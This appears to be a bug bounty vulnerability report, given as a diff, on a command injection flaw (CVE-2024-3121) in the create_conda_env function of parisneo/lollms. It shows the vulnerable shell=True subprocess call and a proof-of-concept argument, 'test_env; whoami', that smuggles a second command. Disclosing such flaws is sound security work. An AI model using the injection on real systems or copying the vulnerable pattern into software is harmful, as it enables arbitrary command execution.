@@ -1,0 +1,45 @@
+Title: Remote Code Execution in create_conda_env function in parisneo/lollms
+
+Proof of Concept: 
+import subprocess
+import sys
+import os
+
+def create_conda_env(env_name, python_version):
+    # Activate the Conda environment
+    if platform.system()=="Windows":
+        conda_path = Path(sys.executable).parent.parent/"miniconda3"/"condabin"/"conda"
+    else:
+        conda_path = Path(sys.executable).parent.parent.parent/"miniconda3"/"bin"/"conda"
+    ASCIIColors.red("Conda path:")
+    ASCIIColors.yellow(conda_path)
+    process = subprocess.Popen(f'{conda_path} create --name {env_name} python={python_version} -y', shell=True)
+
+# POC for the remote code execution vulnerability
+create_conda_env("test_env; whoami", "3.9")
+
+The provided function is vulnerable to a remote code execution vulnerability due to the use of shell=True in the subprocess.Popen function. This allows an attacker to inject arbitrary commands by manipulating the env_name and python_version parameters.
+
+In the provided POC, I've demonstrated how an attacker can inject the whoami command, which returns the current user's name. However, an attacker could inject more harmful commands, leading to a serious security breach.
+
+Impact: 
+An attacker can inject arbitrary commands, leading to a serious security breach
+
+CVE ID: CVE-2024-3121
+Status: (published)
+Vulnerability Type: CWE-94:  Code Injection
+Severity: Medium (6.8)
+Attack Vector: Physical
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: High
+Availability: High
+Registry: Pypi
+Affected Version: 5.9.0
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $75 to $150
+Fix Bounty: $18.75
